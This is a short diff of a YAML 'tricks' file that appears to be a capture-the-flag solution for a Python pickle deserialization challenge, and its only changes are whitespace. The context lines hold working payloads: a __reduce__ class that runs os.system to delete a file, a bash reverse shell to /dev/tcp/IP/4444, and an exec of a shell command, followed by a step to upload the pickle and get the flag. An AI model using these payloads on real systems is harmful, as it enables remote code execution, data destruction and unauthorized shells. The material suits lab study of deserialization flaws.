@@ -28,11 +28,11 @@ tricks:
     how: "Use __reduce__ method"
     payload: |
       import pickle, os
-      
+
       class PickleRCE:
           def __reduce__(self):
               return (os.system, ('rm -f /app/decoy.txt',))
-      
+
       malicious_pickle = pickle.dumps(PickleRCE())
 
   - name: "Step 4: Upload and get flag"
@@ -49,7 +49,6 @@ tricks:
     payload: |
       # Reverse shell
       return (os.system, ('bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"',))
-      
+
       # Execute Python code
       return (exec, ("import os; os.system('whoami')",))
-
